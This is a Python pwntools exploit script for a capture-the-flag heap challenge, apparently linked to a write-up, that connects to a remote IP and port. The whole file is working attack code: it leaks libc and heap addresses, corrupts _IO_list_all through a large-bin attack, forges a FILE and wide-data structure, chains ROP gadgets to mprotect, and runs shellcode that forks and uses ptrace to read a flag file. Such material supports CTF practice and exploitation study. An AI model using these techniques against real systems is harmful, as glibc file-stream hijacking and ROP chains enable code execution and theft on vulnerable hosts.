# see: https://hackmd.io/@RobinJadoul/Bkxyol8gi#Asian-Parents
from pwn import *
context(arch='amd64', os='linux', log_level='debug')
#s=process("./pwn")
s=remote("49.234.30.109",9999)
elf=ELF("./pwn")
libc=ELF("./libc-2.36.so")

def menu(ch):
    s.sendlineafter(b">",str(ch).encode())

def add(idx,size):
    menu(1)
    s.sendlineafter(b"Index: ",str(idx).encode())
    s.sendlineafter(b"Size: ",str(size).encode())

def delete(idx):
    menu(2)
    s.sendlineafter(b"Index: ",str(idx).encode())

def edit(idx,content):
    menu(3)
    s.sendlineafter(b"Index: ",str(idx).encode())
    s.sendafter(b"Content: ",content)

def show(idx):
    menu(4)
    s.sendlineafter(b"Index: ",str(idx).encode())
    return s.recvline(keepends=False)

if __name__=="__main__":
    pause()
    add(0,0x600)
    add(1,0x610)
    add(2,0x5f0)
    delete(0)
    libc.address=u64(show(0)+b"\x00\x00")-(0x7fb54895dcc0-0x7fb548767000)
    success(hex(libc.address))
    #pause()

    add(3,0x610)
    edit(0,b"a"*0x10)
    heap_base=u64(show(0)[-6:]+b"\x00\x00")-0x290
    success(hex(heap_base))

    delete(2)
    edit(0,flat([
        0,0,0,libc.sym._IO_list_all-0x20,
    ]))
    add(4,0x700)

    """
    _IO_list_all->file->_chain @ 2+0x58
    heap_base
    0xec0 <- _IO_list_all _chain controllable
    0xed0 <- write start
    0xec0+0x180 <- fully controlled file structure
    0xec0+0x180+0x180 <- fully controlled _wide_data
    """
    magic=libc.address+0x160E56
    rdi=0x0000000000023b65+libc.address
    rsi=0x00000000000251be+libc.address
    rdx=0x0000000000166262+libc.address
    rax=0x000000000003fa43+libc.address
    syscall_ret=0x000000000008cc36+libc.address
    """
            
    """
    shellcode=f"""
        mov r14,{heap_base}
        mov rax,__NR_fork
        syscall
        test rax,rax
        jnz parent
    child:
        
        mov rdi,3
        call qword ptr [r14+0x2a0+0x48]
        mov rax,__NR_open
        mov rdi,{heap_base+0x2a0}
        xor rsi,rsi
        xor rdx,rdx
        syscall
        // now open should be ok, but leave a err msg here
        cmp rax,0
        jge rnw
        // jmp if fine, loop if failed
    print_errno:
        neg rax
        mov r15,rax
        mov rdi,1
        mov rsi,{heap_base+0x2a0+0x38}
        mov rdx,8
        jmp loop
    loop_start:
        sub r15,1
        mov rax,__NR_write
        syscall
    loop:
        cmp r15,0
        jne loop_start
        jmp final_exit

    rnw:
        mov rdi,rax
        mov rsi,{heap_base+0x1000}
        mov rdx,0x100
        mov rax,__NR_read
        syscall
        mov rdi,1
        mov rax,__NR_write
        syscall
    final_exit:
        mov rax,__NR_exit
        xor rdi,rdi
        syscall
    parent:
        mov rdi,0x4206
        mov rsi,rax
        xor rdx,rdx
        mov rcx,0x80
        call qword ptr [r14+0x2a0+0x50]
        mov rax,__NR_wait4
        xor rdi,rdi
        xor rsi,rsi
        xor rdx,rdx
        syscall
        mov rax,__NR_exit
        xor rdi,rdi
        syscall
    """
    file=flat({
        0:0xfbad1800,
        0x28:1,
        0xd8:libc.sym._IO_wfile_jumps,
        0xa0:heap_base+0xec0+0x180+0x180,
    },filler=b"\x00",length=0x180)
    widedata=flat({
        0x18:0,
        0x30:0,
        0x38:heap_base+0x2a0,
        0xe0:heap_base+0xec0+0x180+0x180,
        0x68:magic,
    },filler=b"\x00",length=0x100)
    file=bytes(file)

    edit(2,flat([
        b"\x00"*0x58,
        heap_base+0xec0+0x180,
    ]).ljust(0x170,b"\x00")
    +file
    +widedata
    )
    edit(0,flat({
        0:"/flag\x00",
        8:flat([0,0,1]),
        0x20:libc.sym.setcontext+61,
        0x28:"/flag.txt",
        0x38:"counter\n",
        0x48:libc.sym.sleep,
        0x50:libc.sym.ptrace,
        0xa8:rdi+1,
        0xa0:heap_base+0x3a0,
        0x100:flat([
            rdi,heap_base,
            rsi,0x20000,
            rdx,7,
            libc.sym.mprotect,
            rdi+1,heap_base+0x3a0+0x48,
        ])+asm(shellcode)
    },filler=b"\x00"))
    menu(5)
    s.interactive()